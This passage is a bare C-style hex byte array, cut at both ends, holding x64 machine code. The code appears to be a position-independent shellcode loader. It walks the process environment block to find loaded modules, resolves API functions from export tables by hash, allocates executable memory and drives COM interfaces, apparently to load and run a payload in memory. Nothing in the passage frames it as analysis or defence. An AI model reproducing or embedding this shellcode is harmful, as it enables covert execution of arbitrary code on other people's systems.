0x00, 0x8b, 0xd8, 0x41, 0xff, 0x55, 0x00, \n  0x41, 0xbc, 0x01, 0x00, 0x00, 0x00, 0x44, 0x8b, 0xc3, 0x48, 0x8b, 0xc8, \n  0x41, 0x8b, 0xd4, 0xff, 0x97, 0xc8, 0x00, 0x00, 0x00, 0x33, 0xdb, 0x4c, \n  0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x82, 0x00, 0x00, 0x00, 0x44, \n  0x8b, 0x85, 0xc0, 0x02, 0x00, 0x00, 0x4c, 0x8d, 0x4c, 0x24, 0x40, 0x48, \n  0x8b, 0xd0, 0x89, 0x5c, 0x24, 0x40, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x68, \n  0x01, 0x00, 0x00, 0x8b, 0xf0, 0x8b, 0x85, 0xc0, 0x02, 0x00, 0x00, 0x85, \n  0xc0, 0x74, 0x5a, 0x33, 0xc9, 0x8b, 0xd0, 0x41, 0xb8, 0x00, 0x30, 0x00, \n  0x00, 0x44, 0x8d, 0x49, 0x04, 0xff, 0x57, 0x48, 0x48, 0x89, 0x87, 0x60, \n  0x0d, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x17, 0x44, 0x8b, 0x85, 0xc0, \n  0x02, 0x00, 0x00, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xc8, 0xe8, 0x2a, 0x2b, \n  0x00, 0x00, 0x41, 0x8b, 0xf4, 0xeb, 0x02, 0x8b, 0xf3, 0x44, 0x8b, 0x85, \n  0xc0, 0x02, 0x00, 0x00, 0x33, 0xd2, 0x49, 0x8b, 0xcf, 0xe8, 0x32, 0x2b, \n  0x00, 0x00, 0x41, 0xff, 0x55, 0x00, 0x4d, 0x8b, 0xc7, 0x41, 0x8b, 0xd4, \n  0x48, 0x8b, 0xc8, 0xff, 0x97, 0xe0, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x6c, \n  0x24, 0x48, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x70, 0x01, 0x00, 0x00, 0x49, \n  0x8b, 0xcd, 0xff, 0x97, 0x70, 0x01, 0x00, 0x00, 0x45, 0x33, 0xf6, 0x48, \n  0x8b, 0x4c, 0x24, 0x58, 0xff, 0x97, 0x70, 0x01, 0x00, 0x00, 0x85, 0xf6, \n  0x74, 0x48, 0x83, 0xbf, 0x34, 0x02, 0x00, 0x00, 0x03, 0x75, 0x3f, 0x48, \n  0x8b, 0x9f, 0x60, 0x0d, 0x00, 0x00, 0x48, 0x8d, 0x97, 0x48, 0x0d, 0x00, \n  0x00, 0x44, 0x8b, 0x8f, 0x58, 0x0d, 0x00, 0x00, 0x48, 0x8d, 0x8f, 0x38, \n  0x0d, 0x00, 0x00, 0x4c, 0x8b, 0xc3, 0xe8, 0xdd, 0x26, 0x00, 0x00, 0x48, \n  0x8b, 0x57, 0x28, 0x48, 0x8d, 0x8f, 0x2c, 0x0c, 0x00, 0x00, 0xe8, 0x8d, \n  0x25, 0x00, 0x00, 0x48, 0x3b, 0x83, 0x18, 0x05, 0x00, 0x00, 0x41, 0x0f, \n  0x45, 0xf6, 0x8b, 0xc6, 0xeb, 0x02, 0x33, 0xc0, 0x48, 0x81, 0xc4, 0x78, \n  0x03, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, \n  0x5e, 0x5b, 0x5d, 0xc3, 0x48, 0x8b, 0xc4, 0x4c, 0x89, 0x48, 0x20, 0x4c, \n  0x89, 0x40, 0x18, 0x48, 0x89, 0x48, 0x08, 0x55, 0x53, 0x56, 0x57, 0x41, \n  0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xa8, 0xb8, 0xfe, \n  0xff, 0xff, 0x48, 0x81, 0xec, 0x08, 0x02, 0x00, 0x00, 0x4c, 0x63, 0x72, \n  0x3c, 0x48, 0x8b, 0xda, 0x41, 0x8b, 0x84, 0x16, 0x88, 0x00, 0x00, 0x00, \n  0x85, 0xc0, 0x0f, 0x84, 0x97, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x3c, 0x02, \n  0x8b, 0x77, 0x18, 0x85, 0xf6, 0x0f, 0x84, 0x88, 0x00, 0x00, 0x00, 0x44, \n  0x8b, 0x47, 0x0c, 0x33, 0xc9, 0x8b, 0x47, 0x20, 0x4c, 0x03, 0xc2, 0x44, \n  0x8b, 0x67, 0x1c, 0x48, 0x03, 0xc2, 0x44, 0x8b, 0x6f, 0x24, 0x4c, 0x03, \n  0xe2, 0x48, 0x89, 0x85, 0x58, 0x01, 0x00, 0x00, 0x4c, 0x03, 0xea, 0x41, \n  0x8a, 0x00, 0x84, 0xc0, 0x74, 0x14, 0x33, 0xd2, 0xff, 0xc1, 0x0c, 0x20, \n  0x88, 0x44, 0x15, 0xf0, 0x8b, 0xd1, 0x42, 0x8a, 0x04, 0x01, 0x84, 0xc0, \n  0x75, 0xee, 0xc6, 0x44, 0x0d, 0xf0, 0x00, 0x49, 0x8b, 0xd1, 0x48, 0x8d, \n  0x4d, 0xf0, 0xe8, 0xc9, 0x24, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, \n  0x48, 0x8b, 0x85, 0x58, 0x01, 0x00, 0x00, 0x8d, 0x4e, 0xff, 0x48, 0x8b, \n  0x95, 0x68, 0x01, 0x00, 0x00, 0x8b, 0xf1, 0x44, 0x8b, 0xf9, 0x8b, 0x0c, \n  0x88, 0x48, 0x03, 0xcb, 0xe8, 0xa3, 0x24, 0x00, 0x00, 0x48, 0x33, 0x44, \n  0x24, 0x20, 0x48, 0x3b, 0x85, 0x60, 0x01, 0x00, 0x00, 0x74, 0x1a, 0x85, \n  0xf6, 0x75, 0xcd, 0x33, 0xc0, 0x48, 0x81, 0xc4, 0x08, 0x02, 0x00, 0x00, \n  0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0x5d, \n  0xc3, 0x43, 0x0f, 0xb7, 0x44, 0x7d, 0x00, 0x45, 0x8b, 0x04, 0x84, 0x4c, \n  0x03, 0xc3, 0x4c, 0x3b, 0xc7, 0x0f, 0x82, 0xaa, 0x00, 0x00, 0x00, 0x41, \n  0x8b, 0x84, 0x1e, 0x8c, 0x00, 0x00, 0x00, 0x48, 0x03, 0xc7, 0x4c, 0x3b, \n  0xc0, 0x0f, 0x83, 0x96, 0x00, 0x00, 0x00, 0x45, 0x33, 0xd2, 0x45, 0x8b, \n  0xca, 0x45, 0x38, 0x10, 0x74, 0x1f, 0x41, 0x83, 0xf9, 0x3c, 0x73, 0x19, \n  0x41, 0x8b, 0xc1, 0x42, 0x8a, 0x0c, 0x00, 0x88, 0x4c, 0x04, 0x30, 0x80, \n  0xf9, 0x2e, 0x74, 0x09, 0x41, 0xff, 0xc1, 0x47, 0x38, 0x14, 0x01, 0x75, \n  0xe1, 0x41, 0x8d, 0x41, 0x01, 0x8b, 0xd0, 0xc6, 0x44, 0x04, 0x30, 0x64, \n  0x41, 0x8d, 0x41, 0x02, 0xc6, 0x44, 0x04, 0x30, 0x6c, 0x41, 0x8d, 0x41, \n  0x03, 0xc6, 0x44, 0x04, 0x30, 0x6c, 0x41, 0x8d, 0x41, 0x04, 0x4e, 0x8d, \n  0x0c, 0x02, 0x44, 0x88, 0x54, 0x04, 0x30, 0x41, 0x8b, 0xd2, 0x45, 0x38, \n  0x11, 0x74, 0x17, 0x83, 0xfa, 0x7f, 0x73, 0x12, 0x8b, 0xca, 0xff, 0xc2, \n  0x42, 0x8a, 0x04, 0x09, 0x88, 0x44, 0x0c, 0x70, 0x46, 0x38, 0x14, 0x0a, \n  0x75, 0xe9, 0x48, 0x8b, 0x8d, 0x50, 0x01, 0x00, 0x00, 0x4c, 0x8d, 0x4c, \n  0x24, 0x70, 0x8b, 0xc2, 0x4c, 0x8d, 0x44, 0x24, 0x30, 0x48, 0x8b, 0xd3, \n  0x44, 0x88, 0x54, 0x04, 0x70, 0xe8, 0x0e, 0x00, 0x00, 0x00, 0x4c, 0x8b, \n  0xc0, 0x49, 0x8b, 0xc0, 0xe9, 0x24, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0xcc, \n  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48, \n  0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, \n  0x20, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x45, 0x33, \n  0xdb, 0x49, 0x8b, 0xf1, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0xea, 0x48, 0x8b, \n  0xf9, 0x4c, 0x8b, 0x50, 0x60, 0x49, 0x8b, 0x42, 0x18, 0x48, 0x8b, 0x58, \n  0x10, 0x4c, 0x39, 0x5b, 0x30, 0x74, 0x2e, 0x4d, 0x85, 0xdb, 0x75, 0x4a, \n  0x48, 0x8b, 0x53, 0x30, 0x48, 0x3b, 0xd5, 0x74, 0x11, 0x45, 0x33, 0xc9, \n  0x4c, 0x8b, 0xc6, 0x48, 0x8b, 0xcf, 0xe8, 0x35, 0x21, 0x00, 0x00, 0x4c, \n  0x8b, 0xd8, 0x48, 0x8b, 0x1b, 0x48, 0x83, 0x7b, 0x30, 0x00, 0x75, 0xd7, \n  0x4d, 0x85, 0xdb, 0x75, 0x21, 0x49, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xe8, \n  0x30, 0x20, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x0e, 0x48, 0x8b, 0xd6, \n  0x48, 0x8b, 0xc8, 0xff, 0x57, 0x38, 0x4c, 0x8b, 0xd8, 0xeb, 0x03, 0x45, \n  0x33, 0xdb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x49, 0x8b, 0xc3, 0x48, 0x8b, \n  0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, \n  0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0x40, 0x53, 0x48, 0x83, \n  0xec, 0x20, 0x48, 0x8b, 0x4a, 0x30, 0x48, 0x8b, 0xda, 0x48, 0x85, 0xc9, \n  0x74, 0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x30, \n  0x00, 0x48, 0x8b, 0x4b, 0x38, 0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b, \n  0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x38, 0x00, 0x48, 0x8b, 0x4b, \n  0x28, 0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, \n  0x48, 0x83, 0x63, 0x28, 0x00, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x85, 0xc9, \n  0x74, 0x26, 0x48, 0x8b, 0x01, 0x48, 0x8b, 0x53, 0x20, 0xff, 0x90, 0xa0, \n  0x00, 0x00, 0x00, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x8b, 0x01, 0xff, 0x50, \n  0x58, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, \n  0x83, 0x63, 0x10, 0x00, 0x48, 0x8b, 0x4b, 0x20, 0x48, 0x85, 0xc9, 0x74, \n  0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x20, 0x00, \n  0x48, 0x8b, 0x4b, 0x18, 0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b, 0x01, \n  0xff, 0x50, 0x10, 0x48, 0x83, 0x63, 0x18, 0x00, 0x48, 0x8b, 0x4b, 0x08, \n  0x48, 0x85, 0xc9, 0x74, 0x0b, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, \n  0x83, 0x63, 0x08, 0x00, 0x48, 0x8b, 0x0b, 0x48, 0x85, 0xc9, 0x74, 0x0a, \n  0x48, 0x8b, 0x01, 0xff, 0x50, 0x10, 0x48, 0x83, 0x23, 0x00, 0x48, 0x83, \n  0xc4, 0x20, 0x5b, 0xc3, 0xf0, 0xff, 0x41, 0x20, 0x8b, 0x41, 0x20, 0xc3, \n  0x48, 0x8b, 0x49, 0x10, 0x45, 0x8b, 0xd1, 0x4c, 0x8b, 0x4c, 0x24, 0x30, \n  0x49, 0x8b, 0xd0, 0x45, 0x8b, 0xc2, 0x48, 0x8b, 0x01, 0x48, 0xff, 0x60, \n  0x50, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x83, \n  0xec, 0x20, 0x49, 0x8b, 0xd9, 0x48, 0x8b, 0xf9, 0x4d, 0x85, 0xc9, 0x75, \n  0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, 0x13, 0x48, 0x8b, 0x49, 0x10, \n  0x48, 0x8b, 0x01, 0xff, 0x50, 0x08, 0x48, 0x8b, 0x47, 0x10, 0x48, 0x89, \n  0x03, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, \n  0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xd2, 0x75, 0x06, 0xb8, 0x03, 0x40, \n  0x00, 0x80, 0xc3, 0xc7, 0x02, 0x01, 0x00, 0x00, 0x00, 0x33, 0xc0, 0xc3, \n  0x48, 0x83, 0xec, 0x48, 0x48, 0x8b, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, \n  0x4c, 0x8b, 0xd9, 0x48, 0x8b, 0x49, 0x10, 0x44, 0x8b, 0xc2, 0x44, 0x0f, \n  0xb7, 0x4c, 0x24, 0x70, 0x49, 0x8b, 0xd3, 0x48, 0x89, 0x44, 0x24, 0x38, \n  0x48, 0x8b, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x11, 0x48, \n  0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, \n  0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x78, 0x48, 0x89, \n  0x44, 0x24, 0x20, 0x41, 0xff, 0x52, 0x58, 0x48, 0x83, 0xc4, 0x48, 0xc3, \n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, \n  0x81, 0xec, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x02, 0x48, 0x8b, 0xf9, \n  0x48, 0x8d, 0x0d, 0x31, 0x02, 0x00, 0x00, 0x48, 0x8b, 0xda, 0x48, 0x89, \n  0x08, 0x48, 0x8d, 0x0d, 0x0c, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, \n  0x89, 0x48, 0x08, 0x48, 0x8d, 0x0d, 0xa6, 0x02, 0x00, 0x00, 0x48, 0x8b, \n  0x02, 0x48, 0x89, 0x48, 0x10, 0x48, 0x8d, 0x0d, 0x50, 0xff, 0xff, 0xff, \n  0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x18, 0x48, 0x8d, 0x0d, 0x06, 0xff, \n  0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x20, 0x48, 0x8d, 0x0d, \n  0xdc, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x28, 0x48, \n  0x8d, 0x0d, 0x3a, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, \n  0x30, 0x48, 0x8d, 0x0d, 0xa0, 0xf3, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, \n  0x89, 0x48, 0x38, 0x48, 0x8d, 0x0d, 0x26, 0xf3, 0xff, 0xff, 0x48, 0x8b, \n  0x02, 0x48, 0x89, 0x48, 0x40, 0x48, 0x8d, 0x0d, 0x18, 0xf3, 0xff, 0xff, \n  0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x48, 0x48, 0x8d, 0x0d, 0x0a, 0xf3, \n  0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x50, 0x48, 0x8d, 0x0d, \n  0xfc, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x58, 0x48, \n  0x8d, 0x0d, 0xee, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, \n  0x60, 0x48, 0x8d, 0x0d, 0xec, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x02, 0x48, \n  0x89, 0x48, 0x68, 0x48, 0x8d, 0x0d, 0xd2, 0xf2, 0xff, 0xff, 0x48, 0x8b, \n  0x02, 0x48, 0x89, 0x48, 0x70, 0x48, 0x8d, 0x0d, 0xc4, 0xf2, 0xff, 0xff, \n  0x48, 0x8b, 0x02, 0x48, 0x89, 0x48, 0x78, 0x48, 0x8d, 0x0d, 0xb6, 0xf2, \n  0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0x80, 0x00, 0x00, 0x00, \n  0x48, 0x8d, 0x0d, 0xa5, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, \n  0x88, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x94, 0xf2, 0xff, 0xff, \n  0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8d, \n  0x0d, 0x83, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0x98, \n  0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x72, 0xf2, 0xff, 0xff, 0x48, 0x8b, \n  0x02, 0x48, 0x89, 0x88, 0xa0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x61, \n  0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0xa8, 0x00, 0x00, \n  0x00, 0x48, 0x8d, 0x0d, 0x50, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, \n  0x89, 0x88, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x3f, 0xf2, 0xff, \n  0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0xb8, 0x00, 0x00, 0x00, 0x48, \n  0x8d, 0x0d, 0x2e, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, \n  0xc0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x55, 0x01, 0x00, 0x00, 0x48, \n  0x8b, 0x02, 0x48, 0x89, 0x88, 0xc8, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x02, \n  0x48, 0x8d, 0x0d, 0x09, 0xf2, 0xff, 0xff, 0xc7, 0x44, 0x24, 0x28, 0x00, \n  0x01, 0x00, 0x00, 0x48, 0x89, 0x88, 0xd0, 0x00, 0x00, 0x00, 0x4c, 0x8d, \n  0x87, 0x19, 0x06, 0x00, 0x00, 0x48, 0x8b, 0x02, 0x48, 0x8d, 0x0d, 0xe9, \n  0xf1, 0xff, 0xff, 0x41, 0x83, 0xc9, 0xff, 0x48, 0x89, 0x88, 0xd8, 0x00, \n  0x00, 0x00, 0x48, 0x8d, 0x0d, 0xd7, 0xf1, 0xff, 0xff, 0x48, 0x8b, 0x02, \n  0x48, 0x89, 0x88, 0xe0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0xc6, 0xf1, \n  0xff, 0xff, 0x48, 0x8b, 0x02, 0x48, 0x89, 0x88, 0xe8, 0x00, 0x00, 0x00, \n  0x48, 0x8d, 0x44, 0x24, 0x30, 0x83, 0x62, 0x20, 0x00, 0x33, 0xc9, 0x48, \n  0x89, 0x7a, 0x28, 0x33, 0xd2, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x57, \n  0x70, 0x48, 0x8d, 0x53, 0x08, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xff, 0x97, \n  0x40, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x15, 0x48, 0x8b, 0x4b, 0x08, \n  0x4c, 0x8d, 0x43, 0x10, 0x48, 0x8d, 0x97, 0xc0, 0x08, 0x00, 0x00, 0x48, \n  0x8b, 0x01, 0xff, 0x50, 0x30, 0x4c, 0x8d, 0x9c, 0x24, 0x40, 0x02, 0x00, \n  0x00, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x73, 0x18, 0x49, 0x8b, 0xe3, \n  0x5f, 0xc3, 0xcc, 0xcc, 0x4c, 0x8b, 0xc9, 0x4d, 0x85, 0xc0, 0x75, 0x06, \n  0xb8, 0x03, 0x40, 0x00, 0x80, 0xc3, 0x48, 0x8b, 0x49, 0x28, 0x48, 0x8b, \n  0x81, 0x30, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x0d, 0x48, 0x8b, \n  0x81, 0x38, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x74, 0x32, 0x48, \n  0x8b, 0x81, 0x40, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x0d, 0x48, \n  0x8b, 0x81, 0x48, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x74, 0x19, \n  0x48, 0x8b, 0x81, 0xc0, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x13, \n  0x48, 0x8b, 0x81, 0xc8, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x75, \n  0x06, 0x4d, 0x89, 0x08, 0x33, 0xc0, 0xc3, 0x49, 0x83, 0x20, 0x00, 0xb8, \n  0x02, 0x40, 0x00, 0x80, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, \n  0x48, 0x8b, 0x49, 0x18, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0xba, 0xfd, \n  0xff, 0xff, 0xff, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x70, 0x33, 0xc0, 0x48, \n  0x83, 0xc4, 0x28, 0xc3, 0x83, 0xc8, 0xff, 0xf0, 0x0f, 0xc1, 0x41, 0x20, \n  0xff, 0xc8, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x41, 0x28, \n  0x8b, 0xca, 0xff, 0x50, 0x68, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, \n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x57, 0x48, 0x81, 0xec, 0xa0, 0x00, 0x00, \n  0x00, 0x48, 0x8b, 0xfa, 0x48, 0x8d, 0x99, 0x70, 0x04, 0x00, 0x00, 0x8a, \n  0x03, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x84, 0xc0, 0x74, 0x56, 0x48, \n  0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0x48, 0x2b, 0xd3, 0x3c, 0x3b, \n  0x74, 0x1b, 0x49, 0x81, 0xf8, 0x80, 0x00, 0x00, 0x00, 0x7d, 0x12, 0x88, \n  0x04, 0x0a, 0x41, 0xff, 0xc1, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc0, 0x8a, \n  0x01, 0x84, 0xc0, 0x75, 0xe1, 0x4d, 0x85, 0xc0, 0x74, 0x27, 0x49, 0x63, \n  0xc9, 0x48, 0x8b, 0xd7, 0x48, 0xff, 0xc1, 0x42, 0xc6, 0x44, 0x04, 0x20, \n  0x00, 0x48, 0x03, 0xd9, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x4a, 0x23, \n  0x00, 0x00, 0x85, 0xc0, 0x75, 0xa5, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xeb, \n  0x02, 0x33, 0xc0, 0x48, 0x8b, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, \n  0x81, 0xc4, 0xa0, 0x00, 0x00, 0x00, 0x5f, 0xc3, 0x40, 0x53, 0x48, 0x83, \n  0xec, 0x50, 0x33, 0xdb, 0x48, 0x8b, 0xc2, 0x4c, 0x8b, 0xc9, 0x48, 0x85, \n  0xd2, 0x74, 0x37, 0x44, 0x8d, 0x43, 0x30, 0x48, 0x8b, 0xc8, 0x48, 0x8d, \n  0x54, 0x24, 0x20, 0x41, 0xff, 0x51, 0x58, 0x83, 0xf8, 0x30, 0x75, 0x22, \n  0x81, 0x7c, 0x24, 0x40, 0x00, 0x10, 0x00, 0x00, 0x75, 0x14, 0x81, 0x7c, \n  0x24, 0x48, 0x00, 0x00, 0x02, 0x00, 0x75, 0x0a, 0x83, 0x7c, 0x24, 0x44, \n  0x04, 0x75, 0x03, 0x8d, 0x58, 0xd1, 0x8b, 0xc3, 0xeb, 0x02, 0x33, 0xc0, \n  0x48, 0x83, 0xc4, 0x50, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, \n  0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, \n  0x41, 0x57, 0x48, 0x81, 0xec, 0x30, 0x02, 0x00, 0x00, 0x4c, 0x8b, 0x89, \n  0xa0, 0x01, 0x00, 0x00, 0x33, 0xc0, 0x45, 0x33, 0xe4, 0x49, 0x8b, 0xf0, \n  0x48, 0x8b, 0xea, 0x48, 0x8b, 0xf9, 0x41, 0xbf, 0x00, 0x01, 0x00, 0x00, \n  0x4d, 0x85, 0xc9, 0x0f, 0x84, 0x9a, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x91, \n  0x60, 0x08, 0x00, 0x00, 0x48, 0x81, 0xc1, 0x50, 0x08, 0x00, 0x00, 0x41, \n  0xff, 0xd1, 0x85, 0xc0, 0x0f, 0x88, 0xba, 0x00, 0x00, 0x00, 0x48, 0x8d, \n  0x44, 0x24, 0x30, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x4c, 0x8d, 0x45, 0x0c, \n  0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0x83, 0xc9, 0xff, 0x33, 0xd2, 0x33, \n  0xc9, 0xff, 0x57, 0x70, 0x48, 0x8b, 0x0e, 0x48, 0x8d, 0x5e, 0x08, 0x4c, \n  0x8d, 0x87, 0x70, 0x08, 0x00, 0x00, 0x4c, 0x8b, 0xcb, 0x48, 0x8d, 0x54, \n  0x24, 0x30, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x18, 0x85, 0xc0, 0x78, 0x3c, \n  0x48, 0x8b, 0x0b, 0x48, 0x8d, 0x94, 0x24, 0x60, 0x02, 0x00, 0x00, 0x48, \n  0x8b, 0x01, 0xff, 0x50, 0x50, 0x85, 0xc0, 0x78, 0x37, 0x44, 0x39, 0xa4, \n  0x24, 0x60, 0x02, 0x00, 0x00, 0x74, 0x20, 0x48, 0x8b, 0x0b, 0x4c, 0x8d, \n  0x4e, 0x10, 0x4c, 0x8d, 0x87, 0x90, 0x08, 0x00, 0x00, 0x48, 0x8d, 0x97, \n  0x80, 0x08, 0x00, 0x00, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x48, 0xeb, 0x03, \n  0x4c, 0x21, 0x23, 0x85, 0xc0, 0x78, 0x09, 0x4c, 0x39, 0xa7, 0xa0, 0x01, \n  0x00, 0x00, 0x75, 0x21, 0x48, 0x8d, 0x46, 0x10, 0x33, 0xd2, 0x4c, 0x8d, \n  0x8f, 0x90, 0x08, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8d, \n  0x87, 0x80, 0x08, 0x00, 0x00, 0x33, 0xc9, 0xff, 0x97, 0x98, 0x01, 0x00, \n  0x00, 0x85, 0xc0, 0x79, 0x10, 0x4c, 0x21, 0x66, 0x10, 0x33, 0xc0, 0xe9, \n  0x45, 0x01, 0x00, 0x00, 0x4c, 0x21, 0x26, 0xeb, 0xcb, 0x48, 0x8b, 0x4e, \n  0x10, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x50, 0x85, 0xc0, 0x0f, 0x88, 0x2b, \n  0x01, 0x00, 0x00, 0x4c, 0x8d, 0x85, 0x0c, 0x01, 0x00, 0x00, 0x4c, 0x8d, \n  0x76, 0x18, 0x45, 0x38, 0x20, 0x75, 0x12, 0x48, 0x8b, 0x4e, 0x10, 0x49, \n  0x8b, 0xd6, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x68, 0x44, 0x8b, 0xf8, 0xeb, \n  0x48, 0x48, 0x8d, 0x44, 0x24, 0x30, 0x44, 0x89, 0x7c, 0x24, 0x28, 0x41, \n  0x83, 0xc9, 0xff, 0x48, 0x89, 0x44, 0x24, 0x20, 0x33, 0xd2, 0x33, 0xc9, \n  0xff, 0x57, 0x70, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xff, 0x97, 0x30, 0x01, \n  0x00, 0x00, 0x48, 0x8b, 0x4e, 0x10, 0x4d, 0x8b, 0xce, 0x45, 0x33, 0xc0, \n  0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xd8, 0x4c, 0x8b, 0x11, 0x41, 0xff, 0x52, \n  0x60, 0x48, 0x8b, 0xcb, 0x44, 0x8b, 0xf8, 0xff, 0x97, 0x38, 0x01, 0x00, \n  0x00, 0x45, 0x85, 0xff, 0x0f, 0x88, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x8b, \n  